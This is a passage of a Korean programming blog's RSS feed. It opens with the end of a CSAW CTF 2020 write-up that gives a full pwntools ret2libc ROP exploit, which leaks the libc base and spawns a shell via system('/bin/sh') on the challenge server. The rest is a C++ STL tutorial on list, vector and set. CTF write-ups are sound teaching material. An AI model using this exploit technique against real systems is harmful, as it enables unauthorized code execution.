class="string">&quot;A&quot;</span>*<span class="number">40</span> <span class="comment"># 32byte + 8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><p>아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다.</p><p>중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다.</p><p>이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다.</p><p>오프셋 계산은 매우 간단합니다.</p><p>libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="number">5016</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400683</span> <span class="comment"># pop rdi ret</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040048e</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> <span class="comment"># 32byte + 8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ROP/">ROP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CSAWCTF-2020/">CSAWCTF 2020</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PicoCTF 2019 Write Up</title>
      <link>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/</link>
      <guid>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/</guid>
      <pubDate>Thu, 10 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트 내용은 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320&quot;&gt;https://www</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트 내용은 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320">https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/PicoCTF2019/">PicoCTF2019</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/11/picoctf-200911/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ STL(Standard Template Library)</title>
      <link>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/</link>
      <guid>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/</guid>
      <pubDate>Wed, 09 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;list-linked-list&quot;&gt;&lt;a href=&quot;#list-linked-list&quot; class=&quot;headerlink&quot; title=&quot;list(linked list)&quot;&gt;&lt;/a&gt;list(linked list)&lt;/h2&gt;&lt;p&gt;list는 순서를 유지</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="list-linked-list"><a href="#list-linked-list" class="headerlink" title="list(linked list)"></a>list(linked list)</h2><p>list는 순서를 유지하는 구조로 이루어진 노드 기반 컨테이너입니다.</p><p>원소가 노드 단위로 저장되며, list는 이중 연결 리스트(double linked list)이고</p><p>임의 접근이 불가능하고 순차적으로 접근만 허용됩니다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="list-선언"><a href="#list-선언" class="headerlink" title="list 선언"></a>list 선언</h3><p>list it    - 빈 컨테이너 리스트 생성<br>list lt(n) - 기본값으로 초기화 된 n개위 원소를 가지는 리스트<br>list lt(n,m) - m으로 초기화 된 n개의 원소를 가지는 리스트<br>list lt(lt2) - lt2의 복사본인 lt 리스트</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link&gt; // library</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br></pre></td></tr></table></figure><h3 id="list-생성자-예제"><a href="#list-생성자-예제" class="headerlink" title="list 생성자 예제"></a>list 생성자 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lt1;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt2</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt3</span><span class="params">(<span class="number">100</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt4</span><span class="params">(lt1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt1 size&quot;</span> &lt;&lt; lt1.size() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt2 size&quot;</span> &lt;&lt; lt2.size() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt3 size&quot;</span> &lt;&lt; lt3.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt4 size&quot;</span> &lt;&lt; lt4.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// lt1 == 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="list-멤버-함수"><a href="#list-멤버-함수" class="headerlink" title="list 멤버 함수"></a>list 멤버 함수</h3><p>|Name|Context<br>lt.front()| 맨 앞의 원소를 반환 및 참조한다.<br>lt.back() | 맨 뒤의 원소를 반환 및 참조한다.<br>lt.begin() | 맨 앞의 원소를 가리키는 iterator를 반환한다.<br>lt.end() | 맨 마지막의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.rbegin()| 뒤에서부터 원소를 순차적으로 접근할 때 사용한다. (뒤집었을 때 첫번째)<br>lt.rend() | 뒤에서부터 원소를 순차적으로 접근할 떄 사용한다. (뒤집었을 떄 마지막)<br>lt.push_front(k) | 앞쪽으로 원소 k를 삽입한다.<br>lt.push_back(k) | 뒤쪽으로 원소 k를 삽입한다.<br>lt.pop_front() | 맨 첫번째 원소를 제거한다.<br>lt_pop_back() | 맨 마지막 원소를 제거한다.<br>lt.insert(iter, k) | iter가 가리키는 위치에 원소 k를 삽입하고 iterator를 반환한다.<br>lt.erase() | iterator가 가리키는 원소를 삭제하고, 반환값은 삭제한 원소의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.size() | 원소의 개수를 반환한다.<br>lt.remove(k) | k와 같은 원소를 모두 삭제한다.<br>lt.remove_if(Predicate) | 단항 조건자 Predicate에 해당하는 원소를 모두 삭제한다.<br>lt.reverse() | 원소들의 순차열을 뒤집는다.<br>lt.sort() | 모든 원소를 오름차순으로 정렬하고, 파라미터가 오는 경우에는 파라미터를 기준으로 정렬한다.<br>lt.empty() | 리스트가 비어있으면 true를 반환하고 아닌 경우 false를 반환한다.<br>lt2.swap(lt) | lt와 lt2를 바꾼다.<br>lt2.splice(iter2, lt) | li2에서 iter2가 가리키는 lt의 모든 원소를 잘라서 붙인다.<br>lt2.unique() | 인접한 원소가 같으면 유일하게 만든다.<br>lt2.merge(lt) | lt를 lt2의 내부로 합병 정렬을 한다(기본 : 오름차순 정렬), 두번쨰 파라미터로 정렬 기준을 받을 수도 있다.</p><h3 id="list-사용-예제"><a href="#list-사용-예제" class="headerlink" title="list 사용 예제"></a>list 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; ltlist;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lt;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lter = ltlist.begin(); <span class="comment">// auto begin</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lter2 = ltlist.end(); <span class="comment">// auto end</span></span><br><span class="line"></span><br><span class="line">    ltlist.push_back(<span class="number">10</span>); <span class="comment">// 뒤쪽으로 10(원소 k) 삽입</span></span><br><span class="line">    ltlist.push_back(<span class="number">11</span>); <span class="comment">// 뒤쪽으로 11(원소 k) 삽입</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.front() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 앞 원소를 반환 및 참조</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.back() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 뒤 원소를 반환 및 참조</span></span><br><span class="line"></span><br><span class="line">    ltlist.push_front(<span class="number">1</span>); <span class="comment">// 앞쪽으로 1(원소 k) 삽입</span></span><br><span class="line">    ltlist.push_back(<span class="number">12</span>); <span class="comment">// 뒤쪽으로 12(원소 k) 삽입</span></span><br><span class="line"></span><br><span class="line">    ltlist.pop_front(); <span class="comment">// 맨 앞쪽의 원소를 제거 == 1이 삭제되겠지?</span></span><br><span class="line">    ltlist.pop_back(); <span class="comment">// 맨 뒤쪽의 원소를 제거 == 12가 삭제되겠지?</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 리스트의 크기를 반환</span></span><br><span class="line"></span><br><span class="line">    lter++; <span class="comment">// 리스트 위치 +1</span></span><br><span class="line"></span><br><span class="line">    ltlist.insert(lter, <span class="number">3</span>); <span class="comment">// 리스트의 두번째 위치에 3을 삽입</span></span><br><span class="line"></span><br><span class="line">    lter2--;</span><br><span class="line"></span><br><span class="line">    ltlist.erase(lter2); <span class="comment">// 마지막 원소를 가리키는 iterator의 원소를 삭제</span></span><br><span class="line"></span><br><span class="line">    ltlist.remove(<span class="number">10</span>); <span class="comment">// 10과 같은 원소 모두 삭제</span></span><br><span class="line"></span><br><span class="line">    ltlist.reverse(); <span class="comment">// 순차열 뒤집기</span></span><br><span class="line"></span><br><span class="line">    ltlist.sort(); <span class="comment">// 오름차순 정렬</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (ltlist.empty() ? <span class="string">&quot;true&quot;</span>: <span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 리스트가 비어있는지 체크(삼항 연산자 사용)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(lt = ltlist.begin(); lt != ltlist.end(); lt++)&#123; <span class="comment">//iterator 반복문 출력 시작</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *lt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>STL의 sequence container의 하나인 vector는 자동으로 메모리가 할당되는 배열이다.</p><p>스택과 비슷한 개념이라고 할 수 있고, 중간에 값을 넣거나 삭제할 수 있다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="vector-선언"><a href="#vector-선언" class="headerlink" title="vector 선언"></a>vector 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v1;</span><br><span class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v2;</span><br></pre></td></tr></table></figure><h3 id="vector-멤버-함수"><a href="#vector-멤버-함수" class="headerlink" title="vector 멤버 함수"></a>vector 멤버 함수</h3><p>|Name|Context<br>|v1.assign(a,b)| v1에 b의 값으로 a개의 원소를 할당한다.<br>|v1.at(idx)| idx번째 원소를 참조한다. (범위 점검)<br>|v1[idx]| idx번째 원소를 참조한다. (범위 점검 X)<br>|v1.front()| 첫번째 원소를 참조한다.<br>|v1.back()| 마지막 원소를 참조한다.<br>|v1.clear()| 모든 원소를 제거한다(size만 제거하고, 메모리(capacity)는 남아있다.)<br>|v1.push_back()| 마지막에 원소를 삽입한다.<br>|v1.pop_back()| 마지막 원소를 삭제한다.<br>|v1.begin()| 첫번째 원소를 가리킨다(iterator)<br>|v1.end()| 마지막 원소를 가리킨다(iterator)<br>|v1.rbegin()| 역순의 첫번째 원소를 가리킨다(reverse 개념)<br>|v1.rend()| 역순의 마지막 원소를 가리킨다(reverse 개념)<br>|v1.reserve(n)| n개의 원소를 저장할 위치를 예약한다. (동적할당)<br>|v1.resize(n)| 크기를 n으로 변경한다.<br>|v1.size()| 원소의 개수를 반환한다.<br>|v1.capacity()| 할당된 공간의 크기를 반환한다.<br>|v1.insert(a,b,c)| a의 위치에 b개의 c값을 삽입한다.<br>|v1.insert(a,b)| a의 위치에 b값을 삽입하고 iterator를 반환한다.<br>|v1.empty()| vector가 비어있는지 체크(true/false 반환)<br>|v2.swap(v1)| v1와 v2의 원소, capacity를 바꾼다(swap 개념)</p><p>여기서 size() 와 capacity()는 다르다.</p><p>size는 할당된 메모리안에 들어있는 요소의 개수를 반환하고, capacity는 할당된 메모리의 크기를 반환해주는 것이다.</p><h3 id="vector-사용-예제"><a href="#vector-사용-예제" class="headerlink" title="vector 사용 예제"></a>vector 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v2;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator iter;</span><br><span class="line"></span><br><span class="line">    v1.push_back(<span class="number">10</span>); <span class="comment">// 맨 뒤에 원소 삽입 아래도 동일</span></span><br><span class="line">    v1.push_back(<span class="number">9</span>);</span><br><span class="line">    v1.push_back(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(iter = v1.begin(); iter != v1.end(); iter++)&#123; <span class="comment">// iterator 반복문 선언</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 사이즈 반환 (10,9,8 이니 총 3개 반환)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.capacity() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 할당 메모리 반환</span></span><br><span class="line"></span><br><span class="line">    v1.pop_back(); <span class="comment">// 맨 끝에 있는 원소를 삭제, 8이 삭제되겠지~</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//v1.clear(); // 모든 원소 삭제</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 사이즈 반환 (clear해서 0 반환)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (v1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector가 비어있는지 체크(삼항 연산자 사용)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.front() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 앞의 원소 반환 및 참조</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.back() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 뒤의 원소 반환 및 참조</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set은 associative container로 노드 기반 컨테이너로 구성되어 있고 균형 이진트리이다.</p><p>key로 불리는 원소의 집합으로 이루어진 컨테이너이다. (중복 허용 X)</p><p>insert 함수에 의해서 원소가 삽입되는데 이 떄의 원소는 자동으로 정렬(오름차순)된다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="set-선언"><a href="#set-선언" class="headerlink" title="set 선언"></a>set 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s1; <span class="comment">// 기본 생성자 선언</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="set-초기화"><a href="#set-초기화" class="headerlink" title="set 초기화"></a>set 초기화</h3><p>|Name|Context<br>|set&lt;자료형&gt; 변수이름| 기본 생성자 선언<br>|set&lt;자료형&gt; 변수이름(복사할 변수이름)| 생성자 선언 후 복사한 값으로 초기화</p><h3 id="set-반복자-iterator"><a href="#set-반복자-iterator" class="headerlink" title="set 반복자(iterator)"></a>set 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="set-용량-크기-size-capacity"><a href="#set-용량-크기-size-capacity" class="headerlink" title="set 용량, 크기(size, capacity)"></a>set 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="set-삽입-삭제"><a href="#set-삽입-삭제" class="headerlink" title="set 삽입, 삭제"></a>set 삽입, 